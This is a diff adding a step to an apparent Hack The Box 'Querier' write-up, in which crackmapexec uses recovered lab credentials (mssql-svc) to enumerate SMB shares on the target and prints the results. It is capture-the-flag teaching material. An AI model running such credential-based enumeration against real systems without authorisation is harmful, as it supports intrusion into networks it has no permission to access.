@@ -373,6 +373,20 @@ $ smbmap -H 10.10.10.125 -u mssql-svc -p corporate568 -d QUERIER
         Reports                                                 READ ONLY
 ```
 
+We can see the same with `crackmapexec`
+```
+$ crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d QUERIER.HTB.LOCAL --shares 
+SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER.HTB.LOCAL) (signing:False) (SMBv1:False)
+SMB         10.10.10.125    445    QUERIER          [+] QUERIER.HTB.LOCAL\mssql-svc:corporate568 
+SMB         10.10.10.125    445    QUERIER          [+] Enumerated shares
+SMB         10.10.10.125    445    QUERIER          Share           Permissions     Remark
+SMB         10.10.10.125    445    QUERIER          -----           -----------     ------
+SMB         10.10.10.125    445    QUERIER          ADMIN$                          Remote Admin
+SMB         10.10.10.125    445    QUERIER          C$                              Default share
+SMB         10.10.10.125    445    QUERIER          IPC$            READ            Remote IPC
+SMB         10.10.10.125    445    QUERIER          Reports         READ
+```
+
 
 Lets connect again on the SQL Server with this new credential
 ```
